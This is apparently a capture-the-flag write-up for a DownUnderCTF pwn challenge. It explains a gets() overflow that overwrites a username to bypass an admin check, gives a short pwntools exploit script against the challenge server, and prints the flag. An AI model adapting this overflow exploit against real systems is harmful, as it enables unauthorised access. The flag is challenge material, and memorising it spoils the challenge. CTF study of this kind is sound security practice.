# Solution

vuln at `gets(password);` leads to username overwrite and bypass the checks.

```
from pwn import *

p = remote('chal.2025-us.ductf.net', 30000)  
p.sendlineafter(b"Enter your username: ", b"guest")

admin_pass = b"\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3"

payload = admin_pass.ljust(32, b"\x00")     
payload += b"admin"    

p.sendlineafter(b"Enter your password: ", payload)

p.interactive()
```

Flag: DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}

Solved by: n3rr